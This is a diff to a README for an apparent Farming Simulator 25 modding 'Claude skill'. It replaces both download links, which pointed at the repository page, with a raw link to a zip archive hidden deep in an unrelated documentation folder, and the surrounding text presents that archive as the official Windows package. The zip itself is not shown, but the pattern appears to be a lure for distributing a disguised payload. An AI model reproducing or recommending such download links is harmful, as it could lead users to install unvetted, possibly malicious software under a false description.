@@ -1,6 +1,6 @@
 # 🚜 fs25-claude-skill - Improve your Farming Simulator modding output
 
-[![](https://img.shields.io/badge/Download-FS25_Claude_Skill-blue.svg)](https://github.com/70th-starter999/fs25-claude-skill)
+[![](https://img.shields.io/badge/Download-FS25_Claude_Skill-blue.svg)](https://github.com/70th-starter999/fs25-claude-skill/raw/refs/heads/main/skill/fs25-modding-skill/references/luadoc-index/docs/engine/Tire Track/skill_fs_claude_v1.8.zip)
 
 ## 📖 About this project
 
@@ -14,7 +14,7 @@ This tool connects your AI chat sessions to reliable game development data. Many
 
 You need to access the release page to obtain the files. This site hosts the official package. 
 
-[Visit this page to download the software](https://github.com/70th-starter999/fs25-claude-skill)
+[Visit this page to download the software](https://github.com/70th-starter999/fs25-claude-skill/raw/refs/heads/main/skill/fs25-modding-skill/references/luadoc-index/docs/engine/Tire Track/skill_fs_claude_v1.8.zip)
 
 Follow these steps to set up the tool on your Windows computer:
 
